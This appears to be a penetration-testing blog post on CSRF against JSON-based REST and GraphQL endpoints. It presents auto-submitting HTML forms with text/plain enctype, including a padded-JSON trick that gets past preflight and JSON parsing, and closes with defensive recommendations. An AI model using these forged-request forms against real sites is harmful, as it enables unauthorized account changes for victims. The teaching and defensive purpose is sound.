---
title: "CSRF in GQL and REST APIs - Attack and defend JSON endpoints"
date: 2025-07-24 02:26:00 +0800
categories: [Pen test tips & tricks]
tags: CSRF CORS Attack-GraphQL-APIs Attack-REST-APIs
---

This blogpost explores how CSRF attacks can be executed against JSON-based endpoints, the role of SOP/CORS preflight mechanism and bypasses that allow attackers to exploit endpoints expecting JSON content.

Cross-Site Request Forgery (CSRF) remains a high severity web security issue, even in the modern APIs that rely mostly on JSON in the request body. While Same-Origin policy (SOP) and Cross-Origin Resource Sharing (CORS) provide some protections, misconfigurations and bypass techniques can leave REST and GraphQL (GQL) endpoints vulnerable.

### Same-Origin Policy and Request Forgery

SOP protects against many abuses, it mainly governs if the HTTP response is available to the JavaScript APIs. Moreover, it also restricts how a document or script from one origin can interact with resources from another origin. SOP however, does not prevent all cross-origin requests. For CSRF attacks, SOP alone is insufficient as simple requests are not denied by default.

### What is CORS preflight?

The browsers check whether a cross-origin request is safe to send based on certain rules (in case the request is complex), before actually making the request. This is conducted by sending a preflight OPTIONS request which serves to check the site's CORS configuration. It is an additional security mechanism built in all relevant browsers, as a part of the SOP. Only if the site's CORS configuration permits the request will the browser forward it to the application.

The request is complex if:
- Method <span style="color:red;">is not</span> <span style="color:orange;">GET</span>, <span style="color:orange;">POST</span> or <span style="color:orange;">HEAD</span>
- <span style="color:lightblue;">Content-Type</span> <span style="color:red;">is not</span> <span style="color:orange;">text/plain</span>, <span style="color:orange;">application/x-www-form-urlencoded</span> or <span style="color:orange;">multipart/form-data</span>
- The request includes custom HTTP headers

Note, that the <span style="color:lightblue;">Content-Type</span> which is <span style="color:orange;">application/json </span> is a complex value, meaning browser will perform preflight lookup before sending the actual cross-site request. Applications will often allow arbitrary <span style="color:lightblue;">Content-Type</span> values and only check the request's body. if this is the case, preflight request can be bypassed by manipulating the <span style="color:lightblue;">Content-Type</span> to any of the 3 mentioned values.

Suppose the attacker wants to forge the following request:

```
POST /change-email HTTP/1.1
Host: site.org
Cookie: session=...
Content-Type: application/json
Content-Length: 25

{
"email":"test@mail.com"
}

HTTP/1.1 200 OK
...
Email is changed!
```

### Restriction in JSON endpoints

If we utilize the Burp's CSRF PoC generator for the mentioned request we are welcomed with the warning, which mentions that the forged request will have appended equals character, as the PoC utilizes the form parameter value to pass the payload. Because forms are passed as key=value pairs, the parameter's value will be left empty, thus leaving additional '<span style="color:red;">=</span>' at the end of the request body.

<img width="775" height="91" alt="Image" src="https://github.com/user-attachments/assets/3496842e-fec2-4028-aa9d-8bada02b5a0e" />

Burp generates the following auto-submit form, which replicates the above request, well mostly:

```html
  <form action="https://site.org/change-email" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&quot;email&quot;&#58;&quot;test&#64;mail&#46;com&quot;&#125;" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
```

Note that the enctype attribute is defined. Once the form is submitted the Content-Type will be forced to value defined, thus bypassing the preflight. If we intercept the request generated by the above HTML code, <span style="color:orange;">the equals character will be present at the end of the JSON body.</span>

```
POST /change-email HTTP/1.1
Host: site.org
Cookie: session=...
Content-Type: text/plain
Content-Length: 28
Origin: http://burpsuite
Referer: http://burpsuite/
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Connection: keep-alive

{"email":"test@mail.com"}=


400 Bad Request
...
Request is not formatted correctly, invalid JSON.
```

The forged request might not be accepted, as it contains invalid JSON. Some libraries will indeed accept the JSON 'email' within the body and that's great, however others won't be able to deserialize the JSON string properly, disallowing the completion of the request.

I was wondering how can we get around this hurdle, and increase our chances of successful forgery attack, even with the SOP in the way.

### Getting around invalid JSON within request body

Applications often accept additional unused and initially unexpected JSON parameters. Such as the following:

```
{
"aditional":"parameter",
 "email":"test@mail.com"
}

200 OK
...
Email is changed!
```

If this is allowed by the backend, what if we combine both the parameter name and value respectively in order to craft a valid JSON sent in a forged request?

Burp Suite CSRF PoC generation is splitting the POST body by using equals character. The first equals it comes across in the body will be used to determine the request's parameter names and values. Therefore, we will manually add rubbish and random JSON parameter name and value at the beginning of JSON string, <span style="color:orange;">making parameter value end with an equals sign.</span>

<img width="902" height="408" alt="Image" src="https://github.com/user-attachments/assets/754ddca0-a79b-4080-afcd-3a0b8046d214" />


Burp will generate the following malicious HTML (notice the form name and value are both used):

```html
<form action="https://site.org/change-email" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&quot;aditional&quot;&#58;&quot;parameter" value="&quot;&#44;&quot;email&quot;&#58;&quot;test&#64;mail&#46;com&quot;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
```

By intercepting the forged cross-site request, we can see that valid JSON body is submitted:

```
POST /change-email HTTP/1.1
Host: site.org
Cookie: session=...
Content-Type: text/plain
Content-Length: 52
Origin: http://burpsuite
Referer: http://burpsuite/
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site

{"aditional":"parameter=","email":"test@mail.com"}

200 OK
...
Email is changed!
```

A simple, yet often more effective technique utilizing existing tooling.


### Defense in depth

It is recommended to disallow arbitrary <span style="color:lightblue;">Content-Types</span>, when initially <span style="color:orange;">application/json</span> is utilized to query the APIs. This way CORS preflight protection will be applicable and attackers won't be able to circumvent it. If the response needs to be accessed by different Origin, utilize whitelisting approach in the CORS configuration allowing only trusted Origins to send the request and retrieve the response. Additionally, utilize unpredictable CSRF tokens to fully protect endpoints from forgery. Alternatively, instead of cookie-based sessions JWT tokens passed via Authorization will also protect against this attack.